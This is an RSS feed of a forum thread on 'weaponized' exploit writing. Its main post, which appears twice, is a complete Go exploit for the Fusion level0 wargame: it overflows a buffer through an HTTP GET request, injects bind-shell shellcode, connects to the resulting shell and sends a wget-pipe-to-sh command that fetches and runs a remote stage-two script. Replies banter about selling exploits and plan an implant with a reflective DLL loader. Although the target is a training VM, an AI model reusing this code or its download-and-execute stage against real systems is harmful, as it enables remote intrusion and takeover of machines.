<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Weaponized Exploit Writing in GO FUSION0</title>
    <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184</link>
    <description>#Intro 
Hello fellow nybbles Null Bytes and Nullers!

Today we are going to be discussing a fairly trivial exploit (FUSION level0) written in a language with very few pre-written hacking toolsets and libraries. We are a bit spoiled by pwntools and all of the SO questions on &quot;how to implement a buffer overflow&quot;. 

I was also just looking for a challenge.  :slight_smile:

Don&#39;t take this post seriously
 
#Why?

Writing Exploits in scripting languages (python, perl, ruby, sic) is so in chic right now, so why change?
Because retro is making a comeback baby, _#MakeExploitsCompileAgain_

Having a binary package to distribute means that we can sell our exploits! 

Yeah, people can reverse engineer our product, but if we make sure to sell only sell to governments and law enforcement then we can even include a EULA!

* C is a great compiled language but it is hard to write in.
For C: (effort) &lt; (money made) = false 

* Pony sounds fun, but it is still in heavy dev so that is out
For Pony: likelihood of hitting a undefined language &quot;feature&quot; &gt; 1

* Rust was another consideration but I arbitrarily decided against it
For Rust: Nah....

The Algorithm for this exploit is as folows
1. make a tcp connection to port 20000 of the server
2. Read the buffer address leak from the debugging feature
3. send a malicious GET request with a URI that is longer than 128 bytes
4. win

It is possible because of the information leak to create an _extremely_ precise exploit.

Our payload is structured as follows

Payload = | &quot;GET &quot; | &quot;JUNK&quot; 139 bytes | address overwrite with leak + 158 | &quot; HTTP/1.1&quot; | 4-5 nops + shellcode |

The addition of 158 to the return address drops us in right after the HTTP/1.1 parameter so we don&#39;t have to worry about prepending some jumping opcodes to our nop sled if we were to jump into URI portion of the payload.

Personally I had a lot of breakage attempting to use the short jump technique. 

   Without further ado - here it is:

```go
package main
import (
	&quot;bufio&quot;
	&quot;encoding/binary&quot;
	&quot;flag&quot;
	&quot;fmt&quot;
	&quot;log&quot;
	&quot;net&quot;
	&quot;strconv&quot;
	&quot;strings&quot;
	&quot;time&quot;
)

func main() {
	// some constants
	shellcode := &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&quot;
	bufflen := 139
	init_exploit()
	// parse cmd line args
	pvaddr := flag.String(&quot;vaddr&quot;, &quot;&quot;, &quot;victim IP in format &lt;address:port&gt;&quot;)
	ps2host := flag.String(&quot;s2_addr&quot;, &quot;&quot;, &quot;http://address to get stage2 script from&quot;)
	flag.Parse()
	vaddr := *pvaddr
	s2host := *ps2host

	fmt.Println(&quot;*******************************&quot;)
	fmt.Println(&quot;**     FUSION00 EXPLOIT      **&quot;)
	fmt.Println(&quot;**            -              **&quot;)
	fmt.Println(&quot;**       BLUEPEGASUS         **&quot;) //gotta have a cute name that means nothing
	fmt.Println(&quot;*******************************&quot;)

	// tries to catch some invalid input
	if vaddr == &quot;&quot; {
		log.Fatal(&quot;[-] invalid arg try -h&quot;)
	}

	// make connection
	fmt.Printf(&quot;[!] connecting to remote host: %s\n&quot;, vaddr)
	conn, err := net.Dial(&quot;tcp&quot;, vaddr)
	if err != nil {
		fmt.Println(&quot;[-] connection failed\t\t:(&quot;)
		log.Fatal(err)
	}
	// defer is soooooo nice
	defer conn.Close()
	fmt.Println(&quot;[+] connected!&quot;)

	// make reader for the network connection
	read_from_con := bufio.NewReader(conn).Read

	// get address leak from program
	s_addr_leak := make([]byte, 256)
	read_from_con(s_addr_leak)
	ret := get_leaked_addr(s_addr_leak)

	// generate payload
	fmt.Println(&quot;[+] generating payload from leaked address&quot;)
	overflow := strings.Repeat(&quot;\xCC&quot;, bufflen)
	payload := []byte(fmt.Sprintf(&quot;%s%s&quot;, overflow, ret))

	// send exploit
	fmt.Println(&quot;[!] sending attack!!!&quot;)
	write_req(payload, []byte(shellcode), conn)

	if s2host != &quot;&quot; {
		stage2(vaddr, s2host)
	}

	fmt.Println(&quot;\n[+] Have a nice day!&quot;)
	return
}

func get_leaked_addr(s []byte) (ret string) {
	str_s := string(s)
	str_addr := strings.Split(str_s, &quot; &quot;)[4]
	str_addr = str_addr[2:]
	fmt.Printf(&quot;[+] got leaked address: %s\n&quot;, str_addr)
	i64_addr, err := strconv.ParseUint(str_addr, 16, 32)
	if err != nil {
		fmt.Println(&quot;[-] failed to parse address&quot;)
		log.Fatal(err)
	}
	i32_addr := uint32(i64_addr)
	i32_addr += 158
	b_ret := make([]byte, 4)
	binary.LittleEndian.PutUint32(b_ret, i32_addr)
	ret = string(b_ret)
	return ret
}

func write_req(payload []byte, sc []byte, conn net.Conn) {
	request := fmt.Sprintf(&quot;GET %s HTTP/1.1%s\r\n\r\n&quot;, payload, sc)
	conn.Write([]byte(request))
}
func init_exploit() {
	return
}

func stage2(vaddr string, s2host string) {

	fmt.Println(&quot;[+] refactoring connection to connect bindshell&quot;)
	fmt.Println(&quot;[!] waiting for a few moments for exploit to finish binding shell&quot;)
	for i := 0; i &lt; 10; i++ {
		time.Sleep(100 * time.Millisecond)
		fmt.Printf(&quot;.&quot;)
	}
	fmt.Printf(&quot;Done!\n&quot;)
	host_ip := strings.Split(vaddr, &quot;:&quot;)[0]
	con_str := fmt.Sprintf(&quot;%s:1337&quot;, host_ip)
	fmt.Printf(&quot;[+]\t%s-&gt;%s:1337\n&quot;, vaddr, host_ip)

	conn, err := net.Dial(&quot;tcp&quot;, con_str)
	if err != nil {
		fmt.Println(&quot;[-] failed to connect to bind shell&quot;)
		log.Fatal(err)
	}
	defer conn.Close()
	fmt.Println(&quot;[+] connected to bindshell!&quot;)
	fmt.Println(&quot;[!] generating script for stage2&quot;)
	r_cmd := &quot;\nwget &quot; + s2host + &quot; -O -|sh&amp;\nexit\n&quot;
	fmt.Printf(&quot;[+] sending stage2 cmd: %s\n&quot;, r_cmd)
	conn.Write([]byte(r_cmd))
	fmt.Println(&quot;[+] wrote command to bindshell&quot;)
	return
}
```</description>
    
    <lastBuildDate>Fri, 22 Dec 2017 00:43:53 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Weaponized Exploit Writing in GO FUSION0</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/7</link>
        <pubDate>Fri, 22 Dec 2017 00:58:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3184-7</guid>
        <source url="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss">Weaponized Exploit Writing in GO FUSION0</source>
      </item>
      <item>
        <title>Weaponized Exploit Writing in GO FUSION0</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/5</link>
        <pubDate>Mon, 20 Nov 2017 07:00:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3184-5</guid>
        <source url="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss">Weaponized Exploit Writing in GO FUSION0</source>
      </item>
      <item>
        <title>Weaponized Exploit Writing in GO FUSION0</title>
        <dc:creator><![CDATA[REal0day]]></dc:creator>
        <description><![CDATA[
            <p>Will be playing with this later this week.<br>
Thank you and keep the content coming!</p>
          <p><a href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/4</link>
        <pubDate>Mon, 20 Nov 2017 00:23:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3184-4</guid>
        <source url="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss">Weaponized Exploit Writing in GO FUSION0</source>
      </item>
      <item>
        <title>Weaponized Exploit Writing in GO FUSION0</title>
        <dc:creator><![CDATA[nullbites]]></dc:creator>
        <description><![CDATA[
            <p>That was a jab at HackingTeam. During the prep for this post I was reading an article about the awful shit they do.</p>
<p>Also, I was thinking about using Py2C or Py2exe to write a light implant for preliminary recon for windows and linux boxes.</p>
<p>It’s main goal would be to provide a “shell” type feature and a reflective dll loader. I was going to use CovertUtils because it is supposed to make covert comms easy, but I was unable to even execute even the example code provided with the project, so that may be a bust… ):</p>
          <p><a href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/3</link>
        <pubDate>Sun, 20 Aug 2017 04:28:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3184-3</guid>
        <source url="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss">Weaponized Exploit Writing in GO FUSION0</source>
      </item>
      <item>
        <title>Weaponized Exploit Writing in GO FUSION0</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="nullbites" data-post="1" data-topic="3184">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/nullbites/40/4676_2.png" class="avatar"> nullbites:</div>
<blockquote>
<p>EULA</p>
</blockquote>
</aside>
<p>I don’t think that the FBI is going to give a sh*t on your EULA <img src="https://0x00sec.org/images/emoji/twitter/joy.png?v=9" title=":joy:" class="emoji" alt=":joy:"><br>
Anyways, thanks for the tutorial. What about using PyToC?<br>
I haven’t used it yet, but what i so far have heard about it, it should suit the purpose.</p>
          <p><a href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/2</link>
        <pubDate>Mon, 14 Aug 2017 15:33:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3184-2</guid>
        <source url="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss">Weaponized Exploit Writing in GO FUSION0</source>
      </item>
      <item>
        <title>Weaponized Exploit Writing in GO FUSION0</title>
        <dc:creator><![CDATA[nullbites]]></dc:creator>
        <description><![CDATA[
            <p><span class="hashtag">#Intro</span><br>
Hello fellow nybbles Null Bytes and Nullers!</p>
<p>Today we are going to be discussing a fairly trivial exploit (FUSION level0) written in a language with very few pre-written hacking toolsets and libraries. We are a bit spoiled by pwntools and all of the SO questions on “how to implement a buffer overflow”.</p>
<p>I was also just looking for a challenge.  <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Don’t take this post seriously</p>
<p><span class="hashtag">#Why</span>?</p>
<p>Writing Exploits in scripting languages (python, perl, ruby, sic) is so in chic right now, so why change?<br>
Because retro is making a comeback baby, <em><span class="hashtag">#MakeExploitsCompileAgain</span></em></p>
<p>Having a binary package to distribute means that we can sell our exploits!</p>
<p>Yeah, people can reverse engineer our product, but if we make sure to sell only sell to governments and law enforcement then we can even include a EULA!</p>
<ul>
<li>
<p>C is a great compiled language but it is hard to write in.<br>
For C: (effort) &lt; (money made) = false</p>
</li>
<li>
<p>Pony sounds fun, but it is still in heavy dev so that is out<br>
For Pony: likelihood of hitting a undefined language “feature” &gt; 1</p>
</li>
<li>
<p>Rust was another consideration but I arbitrarily decided against it<br>
For Rust: Nah…</p>
</li>
</ul>
<p>The Algorithm for this exploit is as folows</p>
<ol>
<li>make a tcp connection to port 20000 of the server</li>
<li>Read the buffer address leak from the debugging feature</li>
<li>send a malicious GET request with a URI that is longer than 128 bytes</li>
<li>win</li>
</ol>
<p>It is possible because of the information leak to create an <em>extremely</em> precise exploit.</p>
<p>Our payload is structured as follows</p>
<p>Payload = | “GET " | “JUNK” 139 bytes | address overwrite with leak + 158 | " HTTP/1.1” | 4-5 nops + shellcode |</p>
<p>The addition of 158 to the return address drops us in right after the HTTP/1.1 parameter so we don’t have to worry about prepending some jumping opcodes to our nop sled if we were to jump into URI portion of the payload.</p>
<p>Personally I had a lot of breakage attempting to use the short jump technique.</p>
<p>Without further ado - here it is:</p>
<pre><code class="lang-auto">package main
import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"
)

func main() {
	// some constants
	shellcode := "\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
	bufflen := 139
	init_exploit()
	// parse cmd line args
	pvaddr := flag.String("vaddr", "", "victim IP in format &lt;address:port&gt;")
	ps2host := flag.String("s2_addr", "", "http://address to get stage2 script from")
	flag.Parse()
	vaddr := *pvaddr
	s2host := *ps2host

	fmt.Println("*******************************")
	fmt.Println("**     FUSION00 EXPLOIT      **")
	fmt.Println("**            -              **")
	fmt.Println("**       BLUEPEGASUS         **") //gotta have a cute name that means nothing
	fmt.Println("*******************************")

	// tries to catch some invalid input
	if vaddr == "" {
		log.Fatal("[-] invalid arg try -h")
	}

	// make connection
	fmt.Printf("[!] connecting to remote host: %s\n", vaddr)
	conn, err := net.Dial("tcp", vaddr)
	if err != nil {
		fmt.Println("[-] connection failed\t\t:(")
		log.Fatal(err)
	}
	// defer is soooooo nice
	defer conn.Close()
	fmt.Println("[+] connected!")

	// make reader for the network connection
	read_from_con := bufio.NewReader(conn).Read

	// get address leak from program
	s_addr_leak := make([]byte, 256)
	read_from_con(s_addr_leak)
	ret := get_leaked_addr(s_addr_leak)

	// generate payload
	fmt.Println("[+] generating payload from leaked address")
	overflow := strings.Repeat("\xCC", bufflen)
	payload := []byte(fmt.Sprintf("%s%s", overflow, ret))

	// send exploit
	fmt.Println("[!] sending attack!!!")
	write_req(payload, []byte(shellcode), conn)

	if s2host != "" {
		stage2(vaddr, s2host)
	}

	fmt.Println("\n[+] Have a nice day!")
	return
}

func get_leaked_addr(s []byte) (ret string) {
	str_s := string(s)
	str_addr := strings.Split(str_s, " ")[4]
	str_addr = str_addr[2:]
	fmt.Printf("[+] got leaked address: %s\n", str_addr)
	i64_addr, err := strconv.ParseUint(str_addr, 16, 32)
	if err != nil {
		fmt.Println("[-] failed to parse address")
		log.Fatal(err)
	}
	i32_addr := uint32(i64_addr)
	i32_addr += 158
	b_ret := make([]byte, 4)
	binary.LittleEndian.PutUint32(b_ret, i32_addr)
	ret = string(b_ret)
	return ret
}

func write_req(payload []byte, sc []byte, conn net.Conn) {
	request := fmt.Sprintf("GET %s HTTP/1.1%s\r\n\r\n", payload, sc)
	conn.Write([]byte(request))
}
func init_exploit() {
	return
}

func stage2(vaddr string, s2host string) {

	fmt.Println("[+] refactoring connection to connect bindshell")
	fmt.Println("[!] waiting for a few moments for exploit to finish binding shell")
	for i := 0; i &lt; 10; i++ {
		time.Sleep(100 * time.Millisecond)
		fmt.Printf(".")
	}
	fmt.Printf("Done!\n")
	host_ip := strings.Split(vaddr, ":")[0]
	con_str := fmt.Sprintf("%s:1337", host_ip)
	fmt.Printf("[+]\t%s-&gt;%s:1337\n", vaddr, host_ip)

	conn, err := net.Dial("tcp", con_str)
	if err != nil {
		fmt.Println("[-] failed to connect to bind shell")
		log.Fatal(err)
	}
	defer conn.Close()
	fmt.Println("[+] connected to bindshell!")
	fmt.Println("[!] generating script for stage2")
	r_cmd := "\nwget " + s2host + " -O -|sh&amp;\nexit\n"
	fmt.Printf("[+] sending stage2 cmd: %s\n", r_cmd)
	conn.Write([]byte(r_cmd))
	fmt.Println("[+] wrote command to bindshell")
	return
}
</code></pre>
          <p><a href="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184/1</link>
        <pubDate>Fri, 04 Aug 2017 22:50:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3184-1</guid>
        <source url="https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184.rss">Weaponized Exploit Writing in GO FUSION0</source>
      </item>
  </channel>
</rss>
